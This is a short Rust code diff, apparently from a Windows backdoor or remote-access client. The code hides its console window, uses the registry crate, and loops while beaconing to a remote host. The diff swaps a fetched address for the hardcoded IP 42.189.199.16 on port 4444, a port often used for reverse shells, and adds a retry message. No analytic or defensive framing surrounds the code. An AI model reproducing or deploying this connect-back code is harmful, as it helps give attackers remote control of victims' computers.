@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 extern crate winreg;
 use reqwest::Error;
@@ -41,9 +41,10 @@ fn main() {
 
     let remote_ip = fetch_url().expect("Failed to fetch remote IP");
     loop {
-        match TcpStream::connect(remote_ip.to_string()) {
+        match TcpStream::connect("42.189.199.16:4444".to_string()) {
             // Will change to something that can be remotely read from
             Err(_) => {
+                println!("Failed to connect to server, retrying in 5 seconds...");
                 thread::sleep(Duration::from_millis(5000));
                 continue;
             }
